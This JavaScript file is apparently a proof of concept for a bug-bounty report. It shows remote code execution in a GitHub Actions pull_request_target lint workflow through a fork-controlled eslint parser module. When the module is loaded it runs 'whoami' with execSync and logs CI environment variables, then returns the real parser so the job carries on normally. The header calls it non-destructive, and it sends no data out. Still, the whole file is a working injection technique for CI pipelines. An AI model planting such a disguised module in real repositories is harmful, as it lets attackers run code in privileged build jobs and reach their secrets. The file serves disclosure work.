// Benign security PoC for Cantina submission: Uniswap/sybil-interface lint.yml pull_request_target RCE.
// Proves fork-controlled code executes inside the privileged pull_request_target job via the eslint
// `parser` field. Strictly non-destructive: no secret is read or exfiltrated, nothing is pushed to any
// Uniswap repo. Returns the real parser so the lint job proceeds normally.
module.exports = (() => {
  const cp = require("child_process");
  let who = "";
  try { who = cp.execSync("whoami").toString().trim(); } catch (e) { who = "err:" + e.message; }
  console.log("=== LINT_ACTION_PR_TARGET_RCE_POC ===");
  console.log("proof: fork-controlled parser executed via node require()");
  console.log("whoami: " + who);
  console.log("GITHUB_EVENT_NAME: " + process.env.GITHUB_EVENT_NAME);
  console.log("GITHUB_REPOSITORY: " + process.env.GITHUB_REPOSITORY);
  console.log("GITHUB_REF: " + process.env.GITHUB_REF);
  console.log("note: benign - no token read, no push; returning real parser");
  console.log("=== END LINT_ACTION_PR_TARGET_RCE_POC ===");
  return require("@typescript-eslint/parser");
})();
